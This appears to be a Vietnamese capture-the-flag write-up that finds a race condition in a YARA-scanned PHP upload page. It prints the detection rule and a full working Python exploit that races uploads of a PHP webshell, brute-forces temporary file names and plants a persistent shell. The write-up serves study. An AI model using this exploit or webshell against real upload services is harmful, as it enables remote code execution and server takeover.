# CYBERCON-2025-Writeup-Web
<img width="527" height="177" alt="image" src="https://github.com/user-attachments/assets/148781ba-cf41-444b-8f93-83558f6ac621" /> <br>
## Phân tích challenge
Khi vào trang chủ sẽ có chức năng upload file như hình bên dưới <br>
<img width="927" height="500" alt="image" src="https://github.com/user-attachments/assets/a78b3386-8a2d-44ca-9794-ca10a4714e14" /> <br>
Mình sẽ upload 1 file bất kì lên xem như nào và thường với chức năng upload này mình hay thử thay đổi tên file php rồi đưa web shell vào RCE xem nhưng không server đã loại bỏ chúng như bên dưới và cùng đi sâu vào mã nguồn xem thử. <br>
<img width="1873" height="871" alt="image" src="https://github.com/user-attachments/assets/447c0451-8bf9-41e7-ad9a-f41dfb90a609" /> <br>
Sau khi xem xét mã nguồn trước tiên mình xem lá cờ nằm chỗ nào thì ở dockerfile lá cờ được tạo ra 8 byte ngẫu nhiên lưu vào file tạm như dưới vậy từ đó bằng cách nào chúng ta cần RCE để lấy được lá cờ đó đk? <br>
```dockerfile
RUN echo 'cybercon{REDACTED}' > /$(mktemp -u XXXXXXXXXXXX).txt
```
Mình xem qua tệp **rule** như sau nó sẽ loại bỏ tất cả rất kĩ đầu vào chúng ta với nội dung chứa <?php hay các lệnh thực thi khác rất nhiều như bên dưới và chúng ta có cùng xem tiếp file upload.php xem <br>
```note
rule Suspicious_there_is_no_such_text_string_in_the_image
{
  meta:
    description = "Broader PHP webshell heuristics for CTF (fast, no backtick regex)"
    severity = "high"
  
  strings:
    $php_any     = /<\?(php|=)?/ nocase
    $php_script  = "<script language=\"php\">" nocase

    $eval1     = "eval" nocase
    $assert1   = "assert" nocase
    $system1   = "system" nocase
    $exec1     = "exec" nocase
    $shexec1   = "shell_exec" nocase
    $passthru1 = "passthru" nocase
    $popen1    = "popen" nocase
    $procopen1 = "proc_open" nocase

    $cmd1      = "cmd" nocase
    $cmd2      = "command" nocase

    $cuf       = "call_user_func(" nocase
    $cufa      = "call_user_func_array(" nocase
    $reflf     = "ReflectionFunction" nocase
    $crefunc   = "create_function(" nocase
    $preg_e    = /preg_replace\s*\(\s*[^,]*['"][^'"]*e['"]/ nocase

    // wrappers & inputs
    $php_input   = "php://input" nocase
    $php_filter  = "php://filter" nocase
    $phar        = "phar://" nocase
    $zipwrap     = "zip://" nocase
    $superglobal = /\$_(GET|POST|REQUEST|COOKIE|FILES|SERVER)\s*\[/ nocase

    // short code
    $short_bt_post   = "<?=`$_POST[" nocase
    $short_bt_get    = "<?=`$_GET[" nocase
    $short_bt_req    = "<?=`$_REQUEST[" nocase
    $short_bt_cookie = "<?=`$_COOKIE[" nocase

    // obfuscators
    $base64    = "base64_decode(" nocase
    $rot13     = "str_rot13(" nocase
    $inflate   = "gzinflate(" nocase
    $gzuncomp  = "gzuncompress(" nocase
    $hex2bin   = "hex2bin(" nocase
    $urldec    = "urldecode(" nocase
    $rawurl    = "rawurldecode(" nocase
    $strrev    = "strrev(" nocase

    // re
    $assign_func = /\$[A-Za-z_]\w*\s*=\s*["'](system|exec|shell_exec|passthru|popen|proc_open)["']/ nocase
    $assign_concat_system = /\$[A-Za-z_]\w*\s*=\s*["']sys["']\s*\.\s*["']tem["']/ nocase
    $var_call_super = /\$[A-Za-z_]\w*\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)\s*\[/ nocase
    $assign_concat_multi = /\$[A-Za-z_]\w*\s*=\s*\$[A-Za-z_]\w*\s*\.\s*["'](tem|xec|shell_exec)["']/ nocase
    $assign_concat_more = /\$[A-Za-z_]\w*\s*=\s*(\$[A-Za-z_]\w*|\s*["']s["']\s*\.\s*["']ys["'])\s*\.\s*["']tem["']/ nocase


  condition:
    ( $php_any or $php_script )
    or
    ( 1 of ( $eval1, $assert1, $system1, $exec1, $shexec1, $passthru1, $popen1, $procopen1,
             $cuf, $cufa, $reflf, $crefunc, $preg_e, $cmd1, $cmd2,
             $short_bt_post, $short_bt_get, $short_bt_req, $short_bt_cookie)
      or ( $assign_func and $var_call_super )
      or ( $assign_concat_system and $var_call_super )
      or ( $assign_concat_multi )
      or ( $assign_concat_more )
    )
    and
    ( 1 of ( $base64, $rot13, $inflate, $gzuncomp, $hex2bin, $urldec, $rawurl, $strrev,
             $php_input, $php_filter, $phar, $zipwrap, $superglobal ) )
}
```
Và đặc biệt mình chú ý ở file **upload.php** ở đây đầu tiên nó sẽ có các rule và yara được bảo vệ ở đây nó sẽ lưu file chúng ta với 1 mã số ngẫu nhiên gồm 4 chữ số với đuôi extension chúng ta upload sau đó nó sẽ upload file của chúng ta lên <br>
```php
<?php
declare(strict_types=1);
ini_set('display_errors', '0');

$TMP_DIR = __DIR__ . '/tmp';
$DST_DIR = __DIR__ . '/uploads';
$YARA    = '/usr/bin/yara';
$RULES   = '/var/app/rules/i_dont_like_webshell.yar';

function four_digits(): string {
  return str_pad((string)random_int(0, 9999), 4, '0', STR_PAD_LEFT);
}
function ext_of(string $name): string {
  $e = strtolower(pathinfo($name, PATHINFO_EXTENSION) ?? '');
  return $e ? ".$e" : '';
}
function bad($m,$c=400){ http_response_code($c); echo htmlspecialchars($m,ENT_QUOTES,'UTF-8'); exit; }

if ($_SERVER['REQUEST_METHOD'] !== 'POST') bad('POST only',405);
if (!isset($_FILES['file']) || !is_uploaded_file($_FILES['file']['tmp_name'])) bad('no file');

$orig = $_FILES['file']['name'] ?? 'noname';
$ext  = ext_of($orig);
$rand = four_digits();
$tmp_path = $TMP_DIR . '/' . $rand . $ext;

if (!move_uploaded_file($_FILES['file']['tmp_name'], $tmp_path)) bad('save failed',500);
chmod($tmp_path, 0644);
```
Sau đó nó sẽ sử dụng sleep tầm khoảng 800000s và sử dụng escapeshellarg bảo vệ đầu vào và đưa vào hàm exec để thực thi nếu khi yara quét phát hiện được nội dung có trong tệp yara nó sẽ loại bỏ tệp ngay sau đó...
```php
usleep(800 * 1000);

$out = []; $ret = 0;
$cmd = sprintf('%s -m %s %s 2>&1',
  escapeshellarg($YARA),
  escapeshellarg($RULES),
  escapeshellarg($tmp_path)
);
exec($cmd, $out, $ret);

$stdout   = implode("\n", $out);
$ruleName = 'Suspicious_there_is_no_such_text_string_in_the_image';
$hitByName = (strpos($stdout, $ruleName) !== false);

if ($ret === 1 || $hitByName) {
  @unlink($tmp_path);
  echo "Upload scanned: MALWARE detected. File removed.<br><a href=/>back</a>";
  exit;
} elseif ($ret === 0) {
  $dst = $DST_DIR . '/' . basename($tmp_path);
  if (!@rename($tmp_path, $dst)) { @copy($tmp_path, $dst); @unlink($tmp_path); }
  echo "Upload scanned: OK. Moved to <a href=./uploads/" . htmlspecialchars(basename($dst)) . ">View Guide</a>";
  exit;
} else {
  @unlink($tmp_path);
  bad('scan error',500);
}
```
```dockerfile
RUN mkdir -p /var/www/html/tmp /var/www/html/uploads /var/app/rules \
 && chown -R www-data:www-data /var/www/html/tmp /var/www/html/uploads

COPY public/ /var/www/html/
COPY rules/  /var/app/rules/
```
Và sau khi xem xét mình thử mọi cách để bypass upload shell php nhưng tệp yara sẽ quét nên khó bypass chúng và sau đó mình xem kĩ lại mình phát hiện được 1 vấn đề đoạn này có thể **race condition** là **usleep(800 * 1000)** trước khi YARA bắt đầu quét file — tức là ứng dụng tạm thời dừng ~800ms trước khi kiểm tra nội dung vừa upload. <br>
Trong khoảng thời gian đó, file đã được ghi hoàn chỉnh vào thư mục web-public tạm thời (ví dụ /public/tmp/<4-chữ-số>.<ext>). <br>
Vì file đã nằm trong web-public, Apache có thể thực thi file đó (ví dụ http://host/tmp/1234.php) trước khi YARA kịp quét và xóa nó. Nếu YARA chấp nhận file (không phát hiện rule), hệ thống sẽ đổi tên / di chuyển file tạm sang thư mục đích, ví dụ /public/uploads hoặc /var/www/html/uploads, làm cho webshell ghi thành công <br>
## Khai Thác
Và nói như cách trên mình sẽ viết tập lệnh python để race condition upload webshell lên:
```py
import requests
import argparse
import base64
import random
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote
from functools import partial

WEB_SHELL = "<?php system($_GET[0]); ?>"

def make_session(pool_size: int = 1000, timeout: float = 1.0) -> requests.Session:
    s = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=pool_size, pool_maxsize=pool_size, max_retries=0
    )
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers.update({"User-Agent": "yara-race-exploit/1.0"})
    s.request = partial(s.request, timeout=timeout)
    return s

def upload_loop(session: requests.Session, upload_url: str, php_code: str, interval: float, stop_evt: threading.Event, field_name: str = "file"):
    files = {field_name: ("shell.php", php_code.encode("utf-8"), "application/x-php")}
    i = 0
    while not stop_evt.is_set():
        try:
            r = session.post(upload_url, files=files, allow_redirects=True)
            if i % 25 == 0:
                sys.stdout.write(f"[upload] status={r.status_code}\n")
                sys.stdout.flush()
        except Exception as e:
            if i % 25 == 0:
                sys.stdout.write(f"[upload] error: {e}\n")
                sys.stdout.flush()
        i += 1
        if interval > 0:
            time.sleep(interval)

def probe_one(session: requests.Session, base: str, tmp_path: str, num: str, cmd: str):
    url = f"{base.rstrip('/')}{tmp_path}/{num}.php?0={quote(cmd, safe='')}"
    try:
        r = session.get(url)
        if r.status_code == 200 or "uid=" in r.text or "uid =" in r.text:
            return url, r.text
    except Exception:
        pass
    return None

def bruteforce(session: requests.Session, base: str, tmp_path: str, cmd: str, threads: int, stop_evt: threading.Event):
    numbers = [f"{i:04d}" for i in range(10000)]
    while not stop_evt.is_set():
        random.shuffle(numbers)
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(probe_one, session, base, tmp_path, n, cmd): n for n in numbers}
            for fut in as_completed(futures):
                if stop_evt.is_set():
                    break
                try:
                    res = fut.result()
                except Exception:
                    continue
                if res:
                    url, text = res
                    print(f"\n[FOUND NUMBER] {url}\n{text}\n")
                    stop_evt.set()
                    return url, text
    return None, None

def upload_shell(session: requests.Session, hit_url: str, base: str, php_code: str, payload_path: str = "/var/www/html/uploads/shell.php"):
    try:
        b64 = base64.b64encode(php_code.encode()).decode()
        php_cmd = f"php -r 'file_put_contents(\"{payload_path}\", base64_decode(\"{b64}\"));'"
        session.get(f"{hit_url}&stage=persist", params={}, allow_redirects=False)
        r = session.get(f"{hit_url.split('?')[0]}?0={quote(php_cmd, safe='')}")
        print(f"[persist] Write Shell To {payload_path}, HTTP {r.status_code}")
        test = session.get(f"{base.rstrip('/')}/uploads/{payload_path.split('/')[-1]}?0=id")
        if test.status_code == 200:
            print(f"[persist] OK: {test.text}")
        else:
            print(f"[persist] test HTTP {test.status_code}")
    except Exception as e:
        print(f"[persist] error: {e}")

def main():
    ap = argparse.ArgumentParser(description="Exploit Race Condition In Upload WebShell.")
    ap.add_argument("--base", required=True, help="Base URL, http://TARGET")
    ap.add_argument("--upload", default="/upload.php", help="Upload path")
    ap.add_argument("--tmp", default="/tmp", help="Temp web path where files appear ")
    ap.add_argument("--cmd", default="id", help="Command to execute via ?0=")
    ap.add_argument("--threads", type=int, default=300, help="Concurrent GET workers over /tmp/0000..9999")
    ap.add_argument("--upload-interval", type=float, default=0.0, help="Sleep seconds between uploads (default: 0)")
    ap.add_argument("--field-name", default="file", help="Form field name for upload (default: file)")
    ap.add_argument("--persist", action="store_true", help="After first HIT, drop persistent /uploads/p.php")
    ap.add_argument("--timeout", type=float, default=0.8, help="HTTP timeout seconds")
    ap.add_argument("--php", default=WEB_SHELL, help="PHP webshell content (default: system($_GET[0]))")
    args = ap.parse_args()

    session = make_session(pool_size=max(64, args.threads * 2), timeout=args.timeout)
    upload_url = f"{args.base.rstrip('/')}{args.upload}"
    tmp_path = args.tmp if args.tmp.startswith("/") else "/" + args.tmp

    stop_evt = threading.Event()
    up_thr = threading.Thread(target=upload_loop, args=(session, upload_url, args.php, args.upload_interval, stop_evt, args.field_name), daemon=True)
    up_thr.start()

    print(f"[i] Brutefore {args.base.rstrip('/')}{tmp_path}/[0000-9999].php while uploading webshell")
    print(f"[i] Threads={args.threads}, timeout={args.timeout}s, upload interval={args.upload_interval}s")
    print(f"[i] Press Ctrl+C To Stop.\n")
    try:
        hit_url, text = bruteforce(session, args.base, tmp_path, args.cmd, args.threads, stop_evt)
        if hit_url:
            print(f"[+] RCE Success At: {hit_url}")
            if args.persist:
                upload_shell(session, hit_url, args.base, args.php)
        else:
            print("[-] No found number.")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    finally:
        stop_evt.set()

if __name__ == "__main__":
    main()
```
Run Python Với Lệnh Sau: <br>
```note
python3 <filename>.py --base http://<HOST>:<PORT> --upload /upload.php --tmp /tmp --cmd "<command-your>" --threads 300 --upload-interval 0.0 --persist
```
Và đã thành công ghi webshell và thực thi lệnh: <br>
<img width="940" height="217" alt="image" src="https://github.com/user-attachments/assets/ce7ab093-e4f0-4b5e-9568-93bda1694be5" /> <br>
Tiếp theo cùng sử dụng lệnh **ls /** để kiểm tra flag có file ngẫu nhiên được flag ghi vào: **mfDuTetrUwGM.txt**  <br>
<img width="947" height="482" alt="image" src="https://github.com/user-attachments/assets/17ffb795-85b7-42a7-bda7-bc74079adbc4" /> <br>
Get FLAG thành công như hình bên dưới:<br>
<img width="944" height="213" alt="image" src="https://github.com/user-attachments/assets/8eee2692-f904-44df-871a-a6caabbbbc9b" />










